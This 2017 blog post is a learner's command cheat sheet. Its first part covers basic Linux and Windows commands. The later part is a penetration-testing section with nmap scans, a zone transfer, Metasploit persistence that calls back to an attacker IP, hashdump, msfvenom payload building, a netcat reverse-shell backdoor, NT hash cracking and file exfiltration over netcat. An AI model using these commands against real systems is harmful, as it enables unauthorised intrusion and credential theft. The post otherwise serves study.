---
layout: post
title: "Basics Cheat Sheet"
date: 2017-09-05
---
<p>
Here is a formatted list of basic commands. I used these as I was learning how to get my way around and added to the list as I learned new things. Writing them down helped me remember the syntax.
</p>
<h2> Get Help … and other info</h2>
<ul>
	<strong>
		<li><code>C:\> <command> /? </code></li>
		<li><code>root@kl~# <command> -h </code></li>
		<li><code>root@kl~# <command> --help </code></li>
		<li><code>root@kl~# man <command> </code></li>
		<li><code>root@kl~# apropos </code></li>
		<li><code>root@kl~# history </code></li>
		<li><code>root@kl~# hostname</code></li>
		<li><code>root@kl~# sudo </code></li>
		<li><code>root@kl~# whoami </code></li>
	</strong>
			<ul>
				<li>(print current user id and name)</li>	
			</ul>
	<strong>
		<li><code>root@kl~# date </code></li> 
		<li><code>C:\>  chdir </code></li>
	</strong>
			<ul>
				<li>(displays location)</li>
			</ul>
	<strong>
		<li><code>root@kl~# pwd </code></li>
	</strong>
			<ul>
				<li>(displays location)</li>
			</ul>
</ul>

<h2>Processes and Things</h2>
<ul>
	<strong>
		<li><code>root@kl~# jobs </code></li>
	</strong>
			<ul>
				<li>(list cronjobs)</li>
			</ul>
	<strong>
		<li><code>root@kl~# kill </code></li>
	</strong>
			<ul>
				<li>(stop processes)</li>
			</ul>
	<strong>
		<li><code>root@kl~# pkill </code></li>
	</strong>
			<ul>
				<li>(stop processes)</li>
			</ul>
	<strong>	
		<li><code> root@kl~# ps –aef </code></li>
	</strong>
			<ul>
				<li>(list processes status)</li>
			</ul>
	<strong>
		<li><code>C:\ tasklist </code></li>
	</strong>
</ul>

<h2>Files</h2>
<ul>
	<li><code>root@kl~# cp <src> <dst> </code></li>
		<ul>		
			<li>(copy)</li>
		</ul>
	<li><code>C:\> copy <src> <dst> </code></li>
	<li><code>root@kl~# clear </code></li>
	<li><code>C:\> cls </code></li>
	<li><code>C:\> dir </code></li>
	<li><code>root@kl~# echo <message> </code></li>
		<ul>
			<li>(print to screen)</li>
		</ul>		
	<li><code>root@kl~# find –iname <file> </code></li>
	<li><code>C:\> findstr /i /s <string> *.txt </code></li>
		<ul>
			<li>(like grep for Windows)</li>
		</ul>
	<li><code>root@kl~# file </code></li>
		<ul>
			<li>(determine file type)</li>
		</ul>
	<li><code>C:\> dir \ <file> /b /s </code></li>
	<li><code>root@kl~# grep </code></li>
		<ul>
			<li>(search files for matching text)</li>
		</ul>
	<li><code>root@kl~# gzip </code></li>
		<ul>
			<li>(compress or decompress files)</li>
		</ul>
	<li><code>root@kl~# less </code></li>
		<ul>
			<li>(display output one screen at a time)</li>
		</ul>	
	<li><code>root@kl~# locate </code></li>
	<li><code>root@kl~# ls </code></li>
	<li><code>root@kl~# mkdir </code></li>
		<ul>
			<li>(new directory)</li>
		</ul>	
	<li><code>root@kl~# mv <src><dst> </code></li>
		<ul>
			<li>(move/rename a file)</li>
		</ul>
	<li><code>C:\>  move <src> <dst> </code></li>
	<li><code>root@kl~# rm </code></li> 
		<ul>
			<li>(remove files)</li>
		</ul>	
	<li><code>C:\> ren </code></li>
		<ul>
			<li>(renames file)</li>
		</ul>		
	<li><code>root@kl~# umask </code></li>
		<ul>
			<li>(users file creation mask)</li>
		</ul>	
	<li><code>root@kl~# uniq </code></li>
		<ul>
			<li>(uniquify files)</li>
		</ul>	
	<li><code>root@kl~# vi/vim </code></li>
		<ul>
			<li>(the best text editor)</li>
		</ul>	
	<li><code>root@kl~# wc </code></li>
		<ul>
			<li>(print byte, word and line counts)</li>
		</ul>	
	<li><code>root@kl~# whereis </code></li>
		<ul>
			<li>(search $path, man pages and source files for program)</li>
		</ul>	
</ul>
		
<h2>Users</h2>
root@kl~# chgrp 
(change group ownership)	
root@kl~# chmod 
(change access permissions) 
root@kl~# chown 
(change file owner and group)
root@kl~# groupadd 
(add a user to a security group)
root@kl~# passwd 
(modify user password)
root@kl~# useradd 
(create new users)
root@kl~# usermod 
(modify user account)
root@kl~# users 
(list logged in users)
Networks
root@kl~# curl (grab webpages)
root@kl~# dig (DNS lookup)
root@kl~# ifconfig
root@kl~# netstat -ano/-plant/-uplant
(networking connections)
root@kl~# nslookup
 (query name servers)
root@kl~# ping
root@kl~# ssh
root@kl~# traceroute
root@kl~# wget 
(get web pages or files)
 
 
Reconnaissance
Discover target’s IP/FQDN domain
nslookup <domain>
nslookup <ip>
Find nameserver for known domain
	root@kl~# dig <domain>
perform a zone transfer to list hosts w/in domain
	root@kl~# dig axfr @<name server> <domain>
determine route to a host
	root@kl~# traceroute <ip>
	C:\> tracert <ip
scan for services and operating system
	root@kl~# nmap –sV –O <ip> 
scan for vulns
	root@kl~# nmap --script=vulns <ip>
Gain and Maintain
establish ssh connection
	root@kl~# ssh <user>@<ip>
remote desktop (rdesktop is port 3389 and vncviewer is 5900)
	rdesktop -u <username> -p <password> <ip>
	vncviewer <ip>
favorites from the msf console
	search <keyword>
	info <module> 
	use <module>
	show options (shows you what to fill in)
	show payloads (shows payloads associated with the exploit you loaded)
	background (use to background sessions)
	pwd vs lpwd & cd vs lcd
	sessions –i <#>  (to interact with sessions)
	run persistence –h 
	run persistence –A –r <your ip> -p <port> -i 10 (call back every 10 seconds if connection is lost)
	hashdump
add a route in msf
	route add <victim subnet> <subnet mask> <session#>
	route print
make a msfvenom payload for windows executable
	root@kl~# msfvenom –p <payload> lhost=<ip> lport=<port> -f exe –i 2 > <file>.exe
	root@kl~# msfvenom –l encoders (for list of encoders)
	set up a listener in metasploit
		use exploit/multi/handler
		set payload
		set ExitOnSession false
		exploit –j (run as a job)
netcat backdoor
	root@kl~# nc –l –p <port> (on launch platform)
	C:\> start nc <launch ip> <port> -e cmd.exe
Escalate and Propagate
get passwords using meterpreter or shell (/etc/shadow or hashdump)
use john to crack NT hashes – remember to add special words you find to the password list in john
	root@kl~# ./john <file> --format=nt
transfer files with netcat
	root@kl~#  nc –l –p <port> > <file> (on your platform to listen for file)
	C:\> nc.exe <your ip> <port>  <  <file to transfer>
transfer files with python
	python –m SimpleHTTPServer <port>
